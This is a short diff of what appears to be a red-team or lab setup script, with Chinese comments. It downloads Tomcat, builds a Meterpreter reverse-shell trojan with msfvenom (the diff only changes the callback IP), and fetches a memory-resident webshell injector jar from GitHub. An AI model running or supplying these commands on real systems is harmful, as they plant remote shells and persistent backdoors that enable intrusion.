@@ -27,7 +27,7 @@ wget https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.31/bin/apache-tomcat-8
 #下载jdk-8u251-linux-x64.tar.gz(已下载好)
 
 #msf木马
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.0.4 LPORT=4444 -f elf > msfshell.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.42.100 LPORT=4444 -f elf > msfshell.elf
 
 #java agent内存马
 wget https://github.com/keven1z/weblogic_memshell/releases/download/1.2/inject.jar
